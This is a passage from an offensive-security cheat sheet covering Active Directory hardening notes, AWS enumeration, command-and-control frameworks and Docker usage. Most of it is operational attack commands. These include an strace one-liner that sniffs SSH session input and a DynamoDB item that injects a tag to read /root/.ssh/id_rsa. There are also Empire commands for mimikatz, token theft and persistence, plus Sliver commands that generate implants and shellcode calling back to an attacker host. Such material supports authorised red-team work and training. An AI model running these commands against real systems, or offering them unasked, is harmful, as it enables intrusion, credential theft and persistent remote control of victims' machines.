        $o.SetSecurityDescriptorBinaryForm($sd)
        $sddl = $o.Sddl
        $sddl1 = $sddl.Replace('(D;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BG)','') #common deny ACE, not suspicious at all
        if ($sddl1.Contains('(D;'))
        {
            Write-Host $key.PSChildName ' ' $sddl
        }
    }
}
```

## Device Guard

- Hardens against malware
- Run trusted code only, enforced in Kernel and Userspace (CCI, UMCI, KMCI)
- UEFI SEcure Boot protects bios and firmware

## General Configuration

- Limit login of DAs to DCs only
- Never run a service with DA privileges
- Check out temporary group memberships (Can have TTL)
- Disable account delegation for sensitive accounts (in ad usersettings)


## LAPS

Centralized password storage with periodic randomization, stored in computer objects in fields `mc-mcsAdmPwd` (cleartext), `ms-mcs-AdmPwdExperiationTime`.

## Layered Architecture

- Tier0: Domain Admins/Enterprise Admins
- Tier1: Significant Resource Access
- Tier2: Administrator for Workstations / Support etc.

## Mitigate Kerberoast

Use strong passwords and manage service accounts.

## Mitigate Skeleton Key

### Run lsass.exe as protected Process

```c
PC C:\> New-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose
```

### Check

```c
PC C:\> Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}
```

## Mitigate Trust Attack

- Enable SID Filtering
- Enable Selective Authentication (access between forests not automated)

## Privileged Administrative Workstations

Use hardened workstation for performing sensitive task.

## Protected Users Group

- Cannot use CredSSP & Wdigest (no more cleartext creds)
- NTLM Hash not cached
- Kerberos does not use DES or RC4
- Requires at least server 2008, need to test impact, no offline sign-on (no caching), useless for computers and service accounts

## Red Forest

- ESAE Enhanced Security Admin Environment
- Dedicated administrative forest for managing critical assets (forests are security boundaries)

## Sniffing SSH Sessions

```c
$ strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
```





# Cloud

- [Resources](#resources)

## Table of Contents

- [AWS](#aws)
- [lazys3](#lazys3)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AWS Security Checklist | Made by Bour Abdelhadi | https://awscheck.fyi |
| AzureHound | Azure Data Exporter for BloodHound | https://github.com/BloodHoundAD/AzureHound |
| BARK | BloodHound Attack Research Kit | https://github.com/BloodHoundAD/BARK |
| Bobber | Bounces when a fish bites - Evilginx database monitoring with exfiltration automation | https://github.com/Flangvik/Bobber |
| GraphRunner | A Post-exploitation Toolset for Interacting with the Microsoft Graph API | https://github.com/dafthack/GraphRunner |
| HacktricksCloud | Welcome to the page where you will find each hacking trick/technique/whatever related to Infrastructure. | https://github.com/carlospolop/hacktricks-cloud |
| lazys3 | A Ruby script to bruteforce for AWS s3 buckets using different permutations. | https://github.com/nahamsec/lazys3 |
| o365-attack-toolkit | A toolkit to attack Office365 | https://github.com/mdsecactivebreach/o365-attack-toolkit |
| o365recon | retrieve information via O365 and AzureAD with a valid cred | https://github.com/nyxgeek/o365recon |
| Power Pwn | An offensive and defensive security toolset for Microsoft 365 Power Platform | https://github.com/mbrg/power-pwn |
| ROADtools | A collection of Azure AD tools for offensive and defensive security purposes | https://github.com/dirkjanm/ROADtools |
| S3cret Scanner | Hunting For Secrets Uploaded To Public S3 Buckets | https://github.com/Eilonh/s3crets_scanner |
| TeamFiltration | TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts | https://github.com/Flangvik/TeamFiltration |

## AWS

```c
$ curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
$ sudo ./aws/install
```

```c
$ aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

### List Buckets

```c
$ aws --endpoint-url=http://s3.<RHOST> s3api list-buckets
```

### List Tables

```c
$ aws dynamodb list-tables --endpoint-url http://s3.<RHOST>/
```

### List Users

```c
$ aws dynamodb scan --table-name users --endpoint-url http://s3.<RHOST>/
```

### Upload Files

```c
$ aws s3api put-object --endpoint-url http://s3.<RHOST>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
```

### Alternativ Upload Technique

```c
$ aws --endpoint-url=http://s3.<RHOST> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
```

### Create Table

```c
$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<RHOST>
```

### Extract Data into Table

```c
$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<RHOST>
```

### List Keys

```c
$ aws --endpoint-url http://127.0.0.1:4566 kms list-keys
```

### List Secrets

```c
$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager list-secrets
```

### Get Secret Values

```c
$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "<VALUE>" --version-stage AWSCURRENT
```

### KMS Enable Key

```c
$ aws --endpoint-url http://127.0.0.1:4566 kms enable-key --key-id f2358fef-e813-4c59-87c8-70e50f6d4f70
```

### KMS Decrypt

```c
$ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8= --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --output text --query Plaintext | base64 --decode > output
```

## lazys3

> https://github.com/nahamsec/lazys3

```c
$ ruby lazys3.rb <DOMAIN>
```








# Command and Control

- [Resources](#resources)

## Table of Contents

- [Covenant](#covenant)
- [Empire](#empire)
- [Hak5 Cloud C2](#hak5-cloud-c2)
- [Havoc](#havoc)
- [Mythic](#mythic)
- [Sliver](#sliver)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AzureC2Relay | AzureC2Relay is an Azure Function that validates and relays Cobalt Strike beacon traffic by verifying the incoming requests based on a Cobalt Strike Malleable C2 profile. | https://github.com/Flangvik/AzureC2Relay |
| Brute Ratel | A Customized Command and Control Center for Red Team and Adversary Simulation | https://bruteratel.com/ |
| Cobalt Strike | Adversary Simulation and Red Team Operations | https://www.cobaltstrike.com/ |
| Covenant | Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers. | https://github.com/cobbr/Covenant |
| DeathStar | DeathStar is a Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs. | https://github.com/byt3bl33d3r/DeathStar |
| Empire | Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. | https://github.com/BC-SECURITY/Empire |
| Hardhat C2 | A c# Command & Control framework | https://github.com/DragoQCC/HardHatC2 |
| Havoc | The Havoc Framework | https://github.com/HavocFramework/Havoc |
| KillDefenderBOF | Beacon Object File PoC implementation of KillDefender | https://github.com/Cerbersec/KillDefenderBOF |
| Merlin | Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang. | https://github.com/Ne0nd0g/merlin |
| MoveKit | Cobalt Strike kit for Lateral Movement | https://github.com/0xthirteen/MoveKit |
| Mythic | A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming. | https://github.com/its-a-feature/Mythic |
| Nightmangle | Nightmangle is post-exploitation Telegram Command and Control (C2/C&C) Agent, created by @1N73LL1G3NC3. | https://github.com/1N73LL1G3NC3x/Nightmangle |
| NimPlant | A light-weight first-stage C2 implant written in Nim. | https://github.com/chvancooten/NimPlant |
| Nuages | A modular C2 framework | https://github.com/p3nt4/Nuages |
| PoshC2 | A proxy aware C2 framework used to aid red teamers with post-exploitation and lateral movement. | https://github.com/nettitude/PoshC2 |
| REC2 (Rusty External C2) | REC2 (Rusty External Command and Control) is client and server tool allowing auditor to execute command from VirusTotal and Mastodon APIs written in Rust. 🦀 | https://github.com/g0h4n/REC2 |
| RedWarden | Cobalt Strike C2 Reverse proxy that fends off Blue Teams, AVs, EDRs, scanners through packet inspection and malleable profile correlation | https://github.com/mgeeky/RedWarden |
| SharpC2 | Command and Control Framework written in C# | https://github.com/rasta-mouse/SharpC2 |
| SILENTTRINITY | An asynchronous, collaborative post-exploitation agent powered by Python and .NET's DLR | https://github.com/byt3bl33d3r/SILENTTRINITY |
| Sliver | Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. | https://github.com/BishopFox/sliver |
| SharpLAPS | Retrieve LAPS password from LDAP | https://github.com/swisskyrepo/SharpLAPS |
| SPAWN | Cobalt Strike BOF that spawns a sacrificial process, injects it with shellcode, and executes payload. Built to evade EDR/UserLand hooks by spawning sacrificial process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing. | https://github.com/boku7/SPAWN |
| Villain | Villain is a C2 framework that can handle multiple TCP socket & HoaxShell-based reverse shells, enhance their functionality with additional features (commands, utilities etc) and share them among connected sibling servers (Villain instances running on different machines). | https://github.com/t3l3machus/Villain |

## Covenant

> https://github.com/cobbr/Covenant

> https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

### Prerequisites

```c
$ sudo apt-get install docker docker-compose
```

### Installation

```c
$ git clone --recurse-submodules https://github.com/cobbr/Covenant
$ cd Covenant/Covenant
$ docker build -t covenant .
```

```c
$ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
```

> https://127.0.0.1:7443/covenantuser/login

### Stop Covenant

```c
$ docker stop covenant
```

### Restart Covenant

```c
$ docker start covenant -ai
```

### Remove and Restart Covenant

```c
$ ~/Covenant/Covenant > docker rm covenant
$ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
```

## Empire

> https://github.com/BC-SECURITY/Empire

### Installation

```c
$ git clone --recursive https://github.com/BC-SECURITY/Empire.git
$ cd Empire
$ ./setup/checkout-latest-tag.sh
$ ./setup/install.sh
```

```c
$ ./ps-empire server
```

```c
./ps-empire client
```

### Starkiller

> http://127.0.0.1:1337/index.html

### Common Commands

```c
(Empire) > listeners                      // list current running listeners
(Empire) > uselistener                    // configure listener
(Empire) > agents                         // list available agents
(Empire) > kill <NAME>                    // kill a specific agent
(Empire: listeners/http) > info           // provide information about used listener or module
(Empire: listeners/http) > back           // get back from current menu
(Empire: listeners) > usestager           // creating payloads
(Empire: agents) > rename <NAME> <NAME>   // renaming specific agent
(Empire: agents) > interact <NAME>        // interacting with specific agent
(Empire: agents) > searchmodule <NAME>    // search for a specific module
(Empire: <NAME>) > usemodule <NAME>       // use a specific module
(Empire: <NAME>) > sysinfo                // show system information
(Empire: <NAME>) > creds                  // show credentials
(Empire: <NAME>) > download               // download files
(Empire: <NAME>) > upload                 // upload files
(Empire: <NAME>) > sleep <60>             // set agent communication to sleep for 60 seconds
(Empire: <NAME>) > steal_token            // impersonate access token
(Empire: <NAME>) > shell [cmd]            // open a shell with cmd.exe
(Empire: <NAME>) > ps                     // show running processes
(Empire: <NAME>) > psinject               // inject agent to another process
(Empire: <NAME>) > scriptimport           // load powershell script
(Empire: <NAME>) > mimikatz               // executes sekurlsa::logonpasswords
(Empire: <NAME>) > usemodule privesc/getsystem            // try privilege escalation
(Empire: <NAME>) > usemodule privesc/sherlock             // run sherlock
(Empire: <NAME>) > usemodule privesc/powerup/allchecks    // perform privilege escalation checks
(Empire: <NAME>) > usemodule situational_awareness/host/antivirusproduct    // provides information about antivirus products
(Empire: <NAME>) > usemodule situational_awareness/host/applockerstatus     // provides information about applocker status
(Empire: <NAME>) > usemodule situational_awareness/host/computerdetails     // provides information about event ids 4648 (RDP) and 4624 (successful logon)
(Empire: <NAME>) > situational_awareness/network/get_spn                       // provides information about spns
(Empire: <NAME>) > situational_awareness/network/powerview/get_domain_trust    // show information about domain trusts
(Empire: <NAME>) > situational_awareness/network/powerview/map_domain_trust    // map information about domain trust
(Empire: <NAME>) > situational_awareness/network/bloodhound3                   // load bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > set CollectionMethodAll    // configure bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > run                        // run the module
(Empire: <NAME>) > download *bloodhound*                                                // download the module
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry    // registry persistence
(Empire: <NAME>) > usemodule persistence/misc/add_sid_history            // sid history persistence
(Empire: <NAME>) > usemodule persistence/misc/memssp                     // ssp persistence
(Empire: <NAME>) > usemodule persistence/misc/skeleton_key               // skeleton key persistence
(Empire: <NAME>) > usemodule persistence/elevated/wmi                    // wmi persistence
```

### Setup HTTP Listener

```c
(Empire) > listeners http
(Empire: listeners/http) > info
(Empire: listeners/http) > set Name <NAME>
(Empire: listeners/http) > set Host <LHOST>
(Empire: listeners/http) > set Port <PORT>
(Empire: listeners/http) > exeute
```

### Setup Stager

```c
(Empire: listeners) > usestager multi/bash
(Empire: listeners/multi/bash) > set Listener <NAME>
(Empire: listeners/multi/bash) > set OutFile /PATH/TO/FILE/<FILE>.sh
(Empire: listeners/multi/bash) > execute
```

### Setup Persistence Measures

```c
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
(Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
(Empire: <NAME>/powershell/persistence/elevated/registry) > run
```

## Hak5 Cloud C2

```c
$ ./c2-3.3.0_amd64_linux -hostname 127.0.0.1 -listenip 127.0.0.1
```

> http://127.0.0.1:8080

## Havoc

> https://github.com/HavocFramework/Havoc

### Python Environment

```c
$ sudo apt-get install build-essential
$ sudo add-apt-repository ppa:deadsnakes/ppa
$ sudo apt-get update
$ sudo apt-get install python3.10 python3.10-dev
```

### Prerequisites

```c
$ sudo apt-get install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm
```

### Installation

#### Building Client

```c
user@host:/opt$ sudo git clone https://github.com/HavocFramework/Havoc.git
user@host:/opt$ cd Havoc/Client
user@host:/opt/Havoc/Client$ make 
user@host:/opt/Havoc/Client$ ./Havoc
```

#### Building Teamserver

```c
user@host:/opt/Havoc/Teamserver$ go mod download golang.org/x/sys
user@host:/opt/Havoc/Teamserver$ go mod download github.com/ugorji/go
user@host:/opt/Havoc/Teamserver$ ./Install.sh
user@host:/opt/Havoc/Teamserver$ make
user@host:/opt/Havoc/Teamserver$ ./teamserver -h
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Teamserver

```c
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Client

```c
user@host:/opt/Havoc/Client$ ./Havoc
```

## Mythic

> https://github.com/its-a-feature/Mythic

> https://docs.mythic-c2.net/

> https://github.com/MythicAgents

> https://github.com/MythicC2Profiles

### Installation

```c
$ sudo apt-get install build-essential ca-certificates curl docker.io docker-compose gnupg gpg mingw-w64 g++-mingw-w64 python3-docker
$ git clone https://github.com/its-a-feature/Mythic.git
$ cd Mythic/
$ sudo make
```

### Install HTTP C2 Profile

```c
$ sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

### Install Mythic Agents

```c
$ sudo ./mythic-cli install github https://github.com/MythicAgents/apfell.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/arachne.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Athena.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/freyja.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/hermes.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Medusa.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/merlin.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Nimplant.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon.git
```

### Finalize the Installation

Check the `.env` file to grab the credentials for the `mythic_admin` user.

```c
$ cat .env
```

> https://127.0.0.1:7443

## Sliver

> https://github.com/BishopFox/sliver

> https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2

> https://github.com/BishopFox/sliver/wiki/Beginner's-Guide

> https://github.com/BishopFox/sliver/wiki/Getting-Started

### Installation

```c
$ curl https://sliver.sh/install | sudo bash
```

### Quick Start

Download the latest `sliver-server` binary and execute it.

> https://github.com/BishopFox/sliver/releases

```c
$ ./sliver-server_linux 

Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.

Unpacking assets ...
[*] Loaded 20 aliases from disk
[*] Loaded 104 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain evolve
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options
```

```c
[server] sliver > multiplayer

[*] Multiplayer mode enabled!
```

```c
[server] sliver > generate --http <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/FOLDER/
```

```c
[server] sliver > http
```

### Administration

```c
sliver > version
sliver > players
sliver > armory
sliver > armory install all
```

### Multiplayer

#### Register a new Operator

```c
root@c2:~# ./sliver-server operator --name <USERNAME> --lhost 127.0.0.1 --save /home/<USERNAME>/.sliver/configs/<USERNAME>.cfg
```

```c
root@c2:~/.sliver/configs$ chown <USERNAME>:<USERNAME> *.cfg
```

```c
username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
```

#### Register a new Operator directly on the Sliver Server

```c
[server] sliver > multiplayer
```

```c
[server] sliver > new-operator --name <USERNAME> --lhost <LHOST>
```

```c
username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
```

#### Kick Operator

```c
[server] sliver > kick-operator -n <USERNAME>
```

### Implant and Beacon Creation 

```
sliver > help generate
sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
```

### Profile Handling

```c
sliver (STALE_PNEUMONIA) > profiles new --mtls <LHOST> --os windows --arch amd64 --format exe session_win_default
sliver (STALE_PNEUMONIA) > profiles generate --save /PATH/TO/BINARY session_win_default
sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format exe  --seconds 5 --jitter 3 beacon_win_default
sliver > profiles generate --save /PATH/TO/BINARY beacon_win_default
```

### Common Commands, Implant and Beacon Handling

```c
sliver > mtls                                                             // Mutual Transport Layer Security
sliver > mtls --lport <LPORT>                                             // Set MTLS port
sliver > jobs                                                             // display current jobs
sliver > implants                                                         // show all created implants
sliver > sessions                                                         // display currently available sessions
sliver > sessions -i <ID>                                                 // interact with a session
sliver > use -i <ID>                                                      // interact with a session
sliver > sessions -k <ID>                                                 // kill a session
sliver > upload //PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY     // upload a file
sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
sliver (NEARBY_LANGUAGE) > tasks fetch 49ead4a9                           // fetch a specific task
sliver (NEARBY_LANGUAGE) > info                                           // provide session information
sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell (ctrl + d to get back)
sliver (NEARBY_LANGUAGE) > netstat                                        // get network information
sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
sliver (NEARBY_LANGUAGE) > background                                     // background the session
sliver (NEARBY_LANGUAGE) > seatbelt -- -group=getsystem                   // execute from armory with parameter
sliver (NEARBY_LANGUAGE) > execute-assembly <FILE>.exe uac                // execute a local binary
sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // execute a local binary
```

### Spawning new Sessions

```c
sliver (NEARBY_LANGUAGE) > interactive
sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY
sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
```

### Port Forwarding

```c
sliver (NEARBY_LANGUAGE) > portfwd
sliver (NEARBY_LANGUAGE) > portfwd add -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add -b 127.0.0.1:<RPORT> -r 127.0.0.1:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add --bind 127.0.0.1:<RPORT> -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd rm -i <ID>
```

### SOCKS Proxy

```c
sliver (NEARBY_LANGUAGE) > socks5 start
sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
```

### Pivoting

```c
sliver (NEARBY_LANGUAGE) > pivots tcp
sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:9898
sliver (NEARBY_LANGUAGE) > pivots
```





# Container

- [Resources](#resources)

## Table of Contents

- [Docker](#docker)
- [Docker-Compose](#docker-compose)
- [kubectl](#kubectl)
- [kubeletctl](#kubeletctl)
- [Kubernetes](#kubernetes)
- [LXD](#lxd)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Awesome Kubernetes (K8s) Security | A curated list for Kubernetes (K8s) Security resources such as articles, books, tools, talks and videos. | https://github.com/magnologan/awesome-k8s-security |
| Bad Pods | A collection of manifests that will create pods with elevated privileges. | https://github.com/BishopFox/badPods |
| Break out the Box (BOtB) | A container analysis and exploitation tool for pentesters and engineers. | https://github.com/brompwnie/botb |
| CDK - Zero Dependency Container Penetration Toolkit | Make security testing of K8s, Docker, and Containerd easier. | https://github.com/cdk-team/CDK |
| deepce | Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)  | https://github.com/stealthcopter/deepce |
| Harpoon | A collection of scripts, and tips and tricks for hacking k8s clusters and containers. | https://github.com/ProfessionallyEvil/harpoon |
| Krane | Kubernetes RBAC static analysis & visualisation tool | https://github.com/appvia/krane |
| Kubletctl | A client for kubelet | https://github.com/cyberark/kubeletctl |
| Kubestriker | A Blazing fast Security Auditing tool for Kubernetes. | https://github.com/vchinnipilli/kubestriker |
| Peirates | Peirates - Kubernetes Penetration Testing tool | https://github.com/inguardians/peirates |
| ThreatMapper | Open source cloud native security observability platform. Linux, K8s, AWS Fargate and more. | https://github.com/deepfence/ThreatMapper |

## Docker

### Installation of the latest Version

> https://docs.docker.com/engine/install/ubuntu/

```c
$ sudo apt-get update
$ sudo apt-get install ca-certificates curl gnupg
```

```c
$ sudo install -m 0755 -d /etc/apt/keyrings
$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
$ sudo chmod a+r /etc/apt/keyrings/docker.gpg
```

```c
$ echo \
  "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```

```c
$ sudo apt-get update
$ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

### Common Commands

```c
$ docker pull <IMAGE>                  // pull image
$ docker pull <IMAGE>:latest           // pull image with latest version
$ docker pull <IMAGE>:<VERSION>        // pull image with specific version
$ docker image ls                      // list images
$ docker image rm <IMAGE>              // remove image
$ docker image rm <IMAGE>:latest       // remove image with latest version
$ docker image rm <IMAGE>:<VERSION>    // remove image with specific version
$ docker run --name <IMAGE>            // use a memorable name
$ docker run -it <IMAGE> /bin/bash     // interact with image
$ docker run -it -v /PATH/TO/DIRECTORY:/PATH/TO/DIRECTORY <IMAGE> /bin/bash   // run image and mount specific directory
$ docker run -d <IMAGE>                // run image in background
$ docker run -p 80:80 <IMAGE>          // bind port on the host
$ docker ps                            // list running containers
$ docker ps -a                         // list all containers
$ docker stop <ID>                     // stops a specific container
$ docker rm <ID>                       // delete a specific container
$ docker exec -it <ID> /bin/bash       // enter a running container
```

```c
$ docker -H <RHOST>:2375 info
$ docker -H <RHOST>:2375 images
$ docker -H <RHOST>:2375 version
$ docker -H <RHOST>:2375 ps -a
$ docker -H <RHOST>:2375 exec -it 01ca084c69b7 /bin/sh
```

### Dockerfiles

- FROM       // build from a specific base image
- RUN        // execute command in the container within a new layer
- COPY       // copy files from the host filesystem
- WORKDIR    // set the root file system of the container
- CMD        // determines what command is run when the container starts (Example: CMD /bin/sh -c <FILE>.sh)
- EXPOSE     // publishes a port in the users context

#### Example Dockerfile

```c
# Example Dockerfile
FROM ubuntu:22.04

# Set working directory
WORKDIR /

# Create a file inside of the root directory
RUN touch <FILE>

# Perform updates
RUN apt-get update -y

# Install apache2
RUN apt-get install apache2 -y

# Expose port 80/TCP
EXPOSE 80

# Start the service
CMD ["apache2ctl", "-D","FOREGROUND"]
```

#### Build Example Dockerfile

```c
$ docker build -t <NAME> .
$ docker run -d --name <NAME> -p 80:80 <NAME>
```

### Control Groups (cgroup) Privilege Escalation

